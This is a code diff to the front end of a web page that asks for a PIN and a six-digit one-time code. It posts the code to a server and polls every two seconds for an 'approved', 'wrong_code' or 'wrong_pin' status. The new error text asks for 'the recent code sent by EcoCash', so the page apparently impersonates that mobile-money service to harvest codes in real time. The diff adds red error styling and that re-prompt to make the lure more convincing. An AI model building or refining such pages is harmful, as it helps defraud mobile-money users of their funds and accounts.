@@ -19,6 +19,7 @@
         .code-inputs input { width: 44px; height: 52px; text-align: center; font-size: 1.3rem; font-weight: 700; border: 2px solid #e5e7eb; border-radius: 12px; outline: none; }
         .code-inputs input:focus { border-color: var(--sky-blue); }
         .code-inputs input.filled { border-color: var(--success); background: #f0fdf4; }
+        .code-inputs input.error { border-color: var(--danger); background: #fef2f2; }
         .timer { text-align: center; font-weight: 700; font-size: 0.9rem; color: var(--dark); padding: 8px; background: #e0f2fe; border-radius: 10px; margin: 8px 0; }
         .timer.warning { background: #fef2f2; color: var(--danger); }
         .btn { width: 100%; padding: 14px; border-radius: 50px; font-weight: 700; font-size: 1rem; border: none; cursor: pointer; margin-top: 8px; }
@@ -76,26 +77,18 @@
 
   var countdownTimer, resendCount = 0, resendCooldown = false;
   startCountdown();
-
-  // Auto-focus first input
   document.querySelector('.cd').focus();
 
   function nextCode(input) {
-    // Allow only digits
     input.value = input.value.replace(/\D/g, '');
     if (input.value.length === 1) {
       var next = input.nextElementSibling;
       if (next && next.classList.contains('cd')) next.focus();
     }
-    // Check if all 6 digits are filled
     var allFilled = true;
-    document.querySelectorAll('.cd').forEach(function(d) {
-      if (d.value === '') allFilled = false;
-    });
+    document.querySelectorAll('.cd').forEach(function(d) { if (d.value === '') allFilled = false; });
     if (allFilled) {
-      // Mark as filled
       document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('filled'); });
-      // Auto-submit after a short delay
       setTimeout(function() { submitCode(); }, 500);
     }
   }
@@ -114,8 +107,7 @@
   async function resendCode() {
     if (resendCooldown || resendCount >= 3) return;
     resendCount++; resendCooldown = true;
-    // Clear all inputs
-    document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); });
+    document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled','error'); });
     document.querySelector('.cd').focus();
     document.getElementById('codeError').textContent = 'OTP Sent (' + resendCount + '/3)'; 
     document.getElementById('codeError').style.color = 'var(--dark)'; 
@@ -140,9 +132,31 @@
     await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: enteredCode }) });
     var checkInterval = setInterval(async function() {
       var res = await fetch('/api/check_status/' + appId); var data = await res.json();
-      if (data.code_status === 'approved') { clearInterval(checkInterval); document.getElementById('successOverlay').classList.add('active'); }
-      else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); document.getElementById('waitSection').style.display = 'none'; document.getElementById('codeSection').style.display = 'block'; document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); }); document.querySelector('.cd').focus(); document.getElementById('codeError').textContent = 'Wrong code. Try again.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); }
-      else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); alert('Wrong PIN. Please use the correct PIN.'); window.location.href = '/'; }
+      if (data.code_status === 'approved') { 
+        clearInterval(checkInterval); 
+        document.getElementById('successOverlay').classList.add('active'); 
+      } else if (data.code_status === 'wrong_code') { 
+        clearInterval(checkInterval); 
+        // Turn boxes red
+        document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); });
+        document.getElementById('codeError').textContent = 'Wrong code. Please enter the recent code sent by EcoCash to verify.';
+        document.getElementById('codeError').style.color = 'var(--danger)';
+        document.getElementById('codeError').classList.add('show');
+        // Clear inputs
+        document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); });
+        document.querySelector('.cd').focus();
+        document.getElementById('waitSection').style.display = 'none';
+        document.getElementById('codeSection').style.display = 'block';
+        startCountdown();
+        setTimeout(function() {
+          document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); });
+          document.getElementById('codeError').classList.remove('show');
+        }, 4000);
+      } else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { 
+        clearInterval(checkInterval); 
+        alert('Wrong PIN. Please use the correct PIN.'); 
+        window.location.href = '/'; 
+      }
     }, 2000);
   }
 </script>
